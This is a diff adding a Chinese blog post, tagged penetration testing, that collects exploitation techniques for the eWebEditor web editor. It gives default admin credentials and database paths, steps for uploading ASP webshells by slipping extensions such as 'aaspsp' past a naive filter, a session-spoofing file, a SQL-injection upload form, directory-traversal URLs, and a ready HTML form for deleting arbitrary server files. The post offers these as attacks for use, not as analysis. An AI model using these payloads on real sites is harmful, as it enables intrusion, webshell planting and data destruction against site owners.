@@ -152,6 +152,121 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ewebeditor在线编辑器漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/21/ewebeditor在线编辑器漏洞/">fck文件编辑器漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/03/21/ewebeditor在线编辑器漏洞/" class="archive-article-date">
+  	<time datetime="2018-03-21T13:07:35.026Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##1:默认管理后台:<br><a href="http://127.0.0.1/ewebeditor/admin_login.asp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/admin_login.asp</a><br>后台如果能进入:<br>可点击样式管理:<br>standard 拷贝一份(直接修改改不了)<br>在拷贝的一份里加入图片类型( asa aaspsp ) 然后点预览<br>在编辑器里点设计 然后直接上传asa大马.<br>上传后 在代码里可以看到马的位置!<br>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是 还有 cer cdx )<br>在cer cdx asa的被删掉 那么马儿就找不到 映射不过去.<br>可以在拷贝过后的样式 图片类型里加入 aaspsp 然后在上传 直接就可以上传asp文件<br>—————————————————————————–</p>
+<p>##2:下载默认数据库<br>127.0.0.1/ewebeditor/db/ewebeditor.mdb<br>然后分析数据库<br>webeditor_system(1) 就可以看到用户名和密码 如果破解不出来<br>可以在webeditor_style(14 样式表里<br>主要看允许上传文件的扩展名(s-fileext s_ingeext)<br>看到一个小黑客曾经搞过 多了asa aaspsp<br>可以用他来利用!(后台找不到的情况下也可以用此方法)<br>可以构造语句:<br>比如 ID=46 s-name =standard1<br>构造 代码: ewebeditor.asp?id=content&amp;style=standard<br>ID和和样式名改过后<br>ewebeditor.asp?id=46&amp;style=standard1<br>然后就是进入编辑器 上传asa 或者asp的 得到webshell<br>前面的1跟2说的是asp版的ewebeditor,其他如php,jsp跟asp的差不多,这里不多说.<br>针对这种方法可能出现的问题:<br>(1)．使用默认用户名和密码无法登录。<br>请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法<em>**</em>，那就当自己的运气不好了。<br>(2)．加了asa类型后发现还是无法上传。<br>应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：<br>sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”), “HTR”, “”)<br>猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp”过滤了“asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名的过滤。<br>(3)．上传了asp文件后，却发现该目录没有运行脚本的权限。<br>呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？<br>(4)．已经使用了第2点中的方法，但是asp类型还是无法上传。<br>看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到“远程类型”了吗？eWebEditor能够设定自动保存远程文件的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中的“应用文件映射”中的“asp”删除。<br>漏洞原理<br>漏洞的利用原理很简单，请看Upload.asp文件：<br>任何情况下都不允许上传asp脚本文件<br>sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)<br>因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！<br>—————————————————————————–</p>
+<p>##3.eWebEditor session欺骗漏洞<br>eWebEditor在线编辑器<br>漏洞文件:Admin_Private.asp<br>漏洞语句:&lt;%<br>If Session(“eWebEditor_User”) = “” Then<br>Response.Redirect “admin_login.asp”<br>Response.End<br>End If<br>只判断了session，没有判断cookies和路径的验证问题。<br>漏洞利用:<br>新建一个h4x0r.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp<br>漏洞影响:虚拟主机的克星.</p>
+<p>##4.ewebeditor asp版 2.1.6 上传漏洞</p>
+<p></p><h1>ewebeditor asp版 2.1.6 上传漏洞利用程序</h1><br><p></p>
+<p><form action="”http://127.1/e/upload.asp?action=save&type=IMAGE&style=luoye’" union="" select="" s_id,s_name,s_dir,s_css,s_uploaddir,s_width,s_height,s_memo,s_issys,s_fileext,s_flashext,="" [s_imageext]%2b’|cer’,s_mediaext,s_filesize,s_flashsize,s_imagesize,s_mediasize,s_stateflag,s_detectfromword,s_initmode,s_baseurl="" from="" ewebeditor_style="" where="" s_name="’standard’and’a’=’a”" method="post" name="myform" enctype="”multipart/form-data”"></form></p>
+<p><input type="file" name="uploadfile" size="100"><br><br></p>
+<p><input type="submit" value="Fuck"><br><br><a href="http://127.1/e/upload.asp" target="_blank" rel="noopener">http://127.1/e/upload.asp</a><br>上传时修改此处上传地址。。。<br>如果你是上传的asp文件则成功后的地址为：<br><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="noopener">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a><br>—————————————————————————–</p>
+<p>##5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)<br>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.<br>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.<br>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了<br>—————————————————————————–</p>
+<p>##6.eweb2.7版本以下又一个注入<br>首先看代码(ewebeditor.asp)：<br>ub InitPara()<br>‘ 取全屏标志<br>sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>‘ 取对应的内容ID<br>sContentID = Trim(Request.QueryString(“id”))<br>If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”<br>‘ 取样式初始值<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”<br>sSql = “select <em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>oRs.Open sSql, oConn, 0, 1<br>If Not oRs.Eof Then<br>sStyleID = oRs(“S_ID”)<br>sStyleName = oRs(“S_Name”)<br>sStyleDir = oRs(“S_Dir”)<br>sStyleCSS = oRs(“S_CSS”)<br>sStyleUploadDir = oRs(“S_UploadDir”)<br>nStateFlag = oRs(“S_StateFlag”)<br>sDetectFromWord = oRs(“S_DetectFromWord”)<br>sInitMode = oRs(“S_InitMode”)<br>sBaseUrl = oRs(“S_BaseUrl”)<br>sStyleUploadDir = Replace(sStyleUploadDir, “”, “/”)<br>If Right(sStyleUploadDir, 1) &lt;&gt; “/” Then<br>sStyleUploadDir = sStyleUploadDir &amp; “/”<br>End If<br>Else<br>ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>End If<br>oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”<br>sSql = “select </em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，<br>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，<br>—————————————————————————–</p>
+<p>##7.ewebeditor2.8最终版删除任意文件漏洞<br>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！<br>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：<br>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next<br>而aSavePathFileName是前面从数据库取出来的：<br>sSavePathFileName = oRs(“D_SavePathFileName”)<br>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：<br>sSavePathFileName = GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName<br>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：<br>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘”, “”), Chr(34), “”), “;”, “”)<br>End Function<br>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录下的eWebEditor.asp不见了！<br>下面给出利用的htm：<br>    <code>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(http://www.oldjun.com)&lt;/TITLE&gt;
+    &lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;
+    &lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;
+    &lt;b&gt;增加新闻&lt;/b&gt;
+    &lt;form action=”http://127.0.0.1/editor/Example/NewsSystem/addsave.asp”
+    method=”post” name=”myform”&gt;
+    &lt;input type=hidden name=d_originalfilename&gt;
+    &lt;input type=hidden name=d_savefilename&gt;
+    &lt;table cellspacing=3 align=center&gt;
+    &lt;tr&gt;&lt;td&gt;要删的文件(相对路径就可以了)：&lt;/td&gt;
+    &lt;td&gt;&lt;input type=”text” name=”d_savepathfilename” value=”” size=”90″&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;新闻标题(随便填)：&lt;/td&gt;
+    &lt;td&gt;&lt;input type=”text” name=”d_title” value=”” size=”90″&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;标题图片：&lt;/td&gt;
+    &lt;td&gt;&lt;select name=”d_picture” size=1&gt;&lt;option value=”&gt;无&lt;/    option&gt;&lt;/select&gt;
+    当编辑区有插入图片时，将自动填充此下拉框&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;&lt;td&gt;新闻内容(随便填)：&lt;/td&gt;
+    &lt;td&gt;&lt;textarea name=”d_content”&gt;&lt;/textarea&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;/table&gt;
+    &lt;input type=submit name=btnSubmit value=” 提 交 “&gt;
+    &lt;input type=reset name=btnReset value=” 重 填 “&gt;
+    &lt;/form&gt;
+    &lt;/BODY&gt;&lt;/HTML&gt;</code></p>
+
+      
+      
+      
+    </div>
+   
+    <div class="article-info article-info-index">
+    <span id="busuanzi_container_page_pv">
+                           本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                  </span>
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/03/21/ewebeditor在线编辑器漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
     <article id="post-fck文件编辑器漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
